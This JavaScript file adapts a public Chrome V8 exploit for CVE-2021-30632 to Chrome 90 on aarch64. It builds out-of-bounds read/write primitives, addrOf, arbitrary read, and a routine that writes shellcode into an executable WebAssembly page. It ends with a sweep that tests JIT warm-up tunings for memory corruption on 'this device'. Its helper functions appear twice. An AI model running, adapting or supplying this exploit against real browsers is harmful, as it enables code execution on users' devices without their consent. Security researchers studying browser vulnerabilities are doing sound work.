// Upstream: github/securitylab SecurityExploits/Chrome/v8/CVE-2021-30632 (m-y-mo)
// Verbatim except for the two browser shims below. Tested upstream on v8 9.3 /
// x64; this device is v8 9.0 (Chrome 90) / aarch64, so offsets and the shellcode
// are expected to need work.
var print = (typeof print === 'function') ? print : console.log;
if (typeof console === 'undefined') { var console = { log: function(){ } }; }
var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module);
var main = instance.exports.main;

function foo(y) {
  x = y;
}

function oobRead() {
  //addrOf b[0] and addrOf writeArr::elements
  return [x[20],x[24]];
}

function oobWrite(addr) {
  x[24] = addr;
}

var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;

var x = arr0;

var arr = new Array(30); arr.fill(4); arr.a = 1;
var b = new Array(1); b.fill(1);
var writeArr = [1.1];

for (let i = 0; i < 19321; i++) {
  if (i == 19319) arr2[0] = 1.1;
  foo(arr1);
}

x[0] = 1.1;

for (let i = 0; i < 20000; i++) {
  oobRead();
}

for (let i = 0; i < 20000; i++) oobWrite(1.1);
foo(arr);

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);
b[0] = instance;
var addrs = oobRead();

function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}


dblArr[0] = addrs[0];
dblArr[1] = addrs[1];

function addrOf(obj) {
  b[0] = obj;
  let addrs = oobRead();
  dblArr[0] = addrs[0];
  return intView[1]; 
}

function arbRead(addr) {
  [elements, addr1] = ftoi32(addrs[1]);
  oobWrite(i32tof(addr,addr1));
  return writeArr[0];
}

function writeShellCode(rwxAddr, shellArr) {
  var intArr = new Uint8Array(400);
  var intArrAddr = addrOf(intArr);
  console.log("intArray addr: " + intArrAddr.toString(16));
  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));
  console.log("intBackingStore: " + ftoi(arbRead(intArrAddr + 0x20)).toString(16));

  [elements, addr1] = ftoi32(addrs[1]);
  oobWrite(i32tof(intArrAddr + 0x20, addr1));
  writeArr[0] = rwxAddr;
  for (let i = 0; i < shellArr.length; i++) {
    intArr[i] = shellArr[i];
  }
}


function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}


dblArr[0] = addrs[0];
dblArr[1] = addrs[1];

function addrOf(obj) {
  b[0] = obj;
  let addrs = oobRead();
  dblArr[0] = addrs[0];
  return intView[1]; 
}



// --- trigger sweep ----------------------------------------------------------
// v8 9.0 vs 9.3: the warm-up geometry differs. Rather than one guess per push,
// try a set of tunings in one run and report each. A healthy (un-corrupted)
// array reads 4.0 everywhere; a working trigger yields pointer-ish words.
var probeView = new ArrayBuffer(8);
var probeDbl = new Float64Array(probeView);
var probeU32 = new Uint32Array(probeView);
function hexOf(v) {
  probeDbl[0] = v;
  return probeU32[1].toString(16) + ':' + probeU32[0].toString(16);
}
function verdictOf(h) {
  var hi = parseInt(h.split(':')[0], 16);
  if (hi === 0x40100000) { return 'plain4.0'; }
  if (hi === 0x7ff80000) { return 'nan'; }
  if (hi === 0) { return 'zero'; }
  return 'CANDIDATE';
}

function attempt(wa, wb, wc, retarget) {
  var a0 = new Array(10); a0.fill(1); a0.a = 1;
  var a1 = new Array(10); a1.fill(2); a1.a = 1;
  var a2 = new Array(10); a2.fill(3); a2.a = 1;
  var lx = a0;
  var la = new Array(30); la.fill(4); la.a = 1;
  var lb = new Array(1); lb.fill(1);

  // the JIT'd body picks whichever global it saw last
  x = lx;
  for (var i = 0; i < wa; i++) {
    if (i === wa - 2) a2[0] = 1.1;
    foo(a1);
  }
  x[0] = 1.1;
  for (var i2 = 0; i2 < wb; i2++) oobRead();
  for (var i3 = 0; i3 < wc; i3++) oobWrite(1.1);
  if (retarget) foo(la);
  lb[0] = instance;

  var h20 = '', h24 = '', v20 = '';
  try { h20 = hexOf(lx[20]); v20 = verdictOf(h20); } catch (e) { h20 = 'err'; }
  try { h24 = hexOf(lx[24]); } catch (e) { h24 = 'err'; }
  var lenIs30 = (typeof la.length === 'number' && la.length === 30);
  print('sweep wa=' + wa + ' wb=' + wb + ' wc=' + wc + ' retarget=' + retarget +
        ' len=' + (retarget ? la.length : 'n/a') +
        ' x20=' + h20 + '(' + v20 + ') x24=' + h24 + ' arr30=' + lenIs30);
  return v20 === 'CANDIDATE';
}

var tups = [
  [19321, 20000, 20000, true],
  [19321, 20000, 20000, false],
  [12000, 15000, 15000, true],
  [12000, 15000, 15000, false],
  [25000, 25000, 25000, false],
  [30000, 30000, 30000, false],
  [16000, 19321, 19321, false],
  [20000, 20000, 20000, true]
];
print('sweep-begin');
for (var t = 0; t < tups.length; t++) {
  try { attempt(tups[t][0], tups[t][1], tups[t][2], tups[t][3]); }
  catch (e) { print('sweep-threw t=' + t + ' ' + e.name); }
}
print('sweep-end');
